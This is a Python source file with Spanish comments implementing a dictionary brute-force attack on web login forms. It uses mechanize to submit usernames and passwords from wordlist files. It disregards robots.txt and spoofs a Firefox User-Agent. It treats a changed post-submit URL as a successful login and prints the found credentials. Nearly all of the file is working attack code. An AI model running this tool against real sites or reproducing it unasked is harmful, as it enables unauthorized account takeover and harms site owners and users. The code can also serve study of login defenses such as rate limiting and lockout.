import mechanize
from colorama import init,Fore
import parametros as params


init()


deteniendo = False

def generador(diccionario):
    
    with open(f'diccionarios/{diccionario}','r') as arch:
        try:
            for linea in arch:
            
                yield linea.strip()
        except UnicodeDecodeError:
            print(Fore.WHITE+f'error en linea: {linea.strip()}')
            yield None
        except Exception as e:
        
            print(Fore.RED+f'\nocurrio un error al leer el dicionario: {e}')
            yield 'error'


def leer_dic(nombre):
    try:
        with open(f'diccionarios/{nombre}','r') as arch:
            return str(arch.read()).strip()
        
    except UnicodeDecodeError as e:
        print(Fore.RED+f'\nerror de decodificacion del diccionario: {e}')
    
    except Exception as e:
        
        print(Fore.RED+f'\nocurrio un error al leer el dicionario: {e}')

def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
    global deteniendo
    #url_login --> url del login de pagina web cuando se envia un dato invalido
    #usuario --> si conozco el usuario se almacena aca
    #c_contr --> atriqueta name de html de contraseña
    #c_usuario --> atriqueta name de html de usuario
    #n --> numero de formulario
    encontrada = False
    try:
        web = mechanize.Browser()
        encabezado = [
            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0')
        ]

        web.set_handle_robots(False)
        web.addhandlers = encabezado

        web.open(url_login)

        web.select_form(nr=n)
        web[c_usuario] = usuario
        web[c_contr] = contr_

        pag2= web.submit()
        url2 = pag2.geturl()

        #si conozco el usuario
        if url2 != url_login and params.param.usuario != None:
            print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
            deteniendo = True

            exit()

        elif url2 != url_login and params.param.dic_u != None:
            print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')

            deteniendo = True
            exit()

        else:
            if not deteniendo:
                print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
            
                


    except mechanize.ControlNotFoundError:
        print(Fore.RED+'no se encuentra el formulario o las casillas no conciden')

        exit()
    
    except:
        pass

    finally:
        web.close()
        
    